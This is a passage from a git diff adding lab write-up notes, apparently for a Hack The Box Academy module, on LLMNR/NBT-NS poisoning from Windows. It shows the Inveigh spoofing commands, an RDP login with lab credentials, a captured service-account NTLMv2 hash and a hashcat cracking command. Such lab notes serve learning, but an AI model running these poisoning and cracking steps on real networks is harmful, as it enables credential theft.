@@ -68,3 +68,68 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 <figure><img src="../../../.gitbook/assets/image (1051).png" alt=""><figcaption></figcaption></figure>
+
+## LLMNR/NBT-NS Poisoning - from Windows
+
+So let's imagine we're on a Windows computer, we can also do this attack, we're going to see the process with the Inveigh tool, a tool like responder but written in PowerShell and C#
+
+#### Start using Inveigh
+
+```
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+
+Key                     Value
+---                     -----
+ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
+KerberosHostHeader      System.Management.Automation.ParameterMetadata
+ProxyIgnore             System.Management.Automation.ParameterMetadata
+PcapTCP                 System.Management.Automation.ParameterMetadata
+[...]
+```
+
+Now we need to start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
+
+```
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+And we see some hits, the interface is very similar to Responder&#x20;
+
+It's good to know that the Powershell version is not updated anymore, the author updates the C# version
+
+to run the C# tool we can just:
+
+```
+PS C:\htb> .\Inveigh.exe
+```
+
+### Practical Example
+
+I first connect through RDP:
+
+```
+xfreerdp /v:10.129.199.67 /u:htb-student /p:Academy_student_AD!
+```
+
+I find the Inveigh file:
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+I run the exe file:
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+And quickly get the hash of svc\_qualys:
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+I take it on my local machine, put it in a file and launch hashcat:
+
+```
+hashcat -m 5600 qualys /usr/share/wordlists/rockyou.txt
+```
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
